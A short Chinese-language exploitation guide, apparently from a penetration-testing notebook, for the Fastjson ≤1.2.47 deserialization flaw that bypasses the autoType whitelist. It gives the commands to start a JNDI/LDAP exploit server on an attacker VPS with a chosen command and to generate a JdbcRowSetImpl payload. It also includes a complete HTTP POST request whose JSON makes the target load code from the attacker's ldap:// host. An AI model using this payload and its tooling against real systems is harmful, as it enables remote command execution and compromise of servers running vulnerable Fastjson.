## 漏洞概述

Fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。

`heckAutoType`黑名单中可绕过

## 影响范围

```http
Fastjson <= 1.2.47
```

## 漏洞利用

1、启动LDAP服务

[@welk1n（JNDI-Injection-Exploit）](https://github.com/welk1n/JNDI-Injection-Exploit)

需要VPS放行端口，此工具会自动打开监听端口

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "要执行的命令" -A "VPS-IP"
```

2、生成Payload（可跳过，直接用payload）

[@c0ny1（FastjsonExploit）](https://github.com/c0ny1/FastjsonExploit) 一键生成个版本Payload，并启动利用环境

这个启动不了环境会报错，所一用上边的方法启动环境，这里的执行命令随便写，不影响结果

```bash
#编译
mvn clean package -DskipTests
```

```bash
java -jar FastjsonExploit-0.1-beta2-all.jar JdbcRowSetImpl5 ldap://110.x.x.4:1389/qlwkdn "cmd:ls"
```

生成的payload

```http
{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1x.x.x.x:1389/qlwkdn","autoCommit":true}}}
```

3、Burp发送payload

```http
POST / HTTP/1.1
Host: 192.168.2.133:32770
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 203

{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1x.x.x.x:1389/qlwkdn","autoCommit":true}}}
```

## 参考链接

[Fastjson反序列化漏洞的检测和利用](https://mp.weixin.qq.com/s?__biz=MzIyNzY1MzUxMQ==&mid=100000244&idx=1&sn=801c947da8f74a4bda5039994951f040&chksm=685ca31c5f2b2a0a414e2848cc7f6e5a6778bbd309fc8d46bb4f4c7769d9f43ae06e0bae4959#rd)



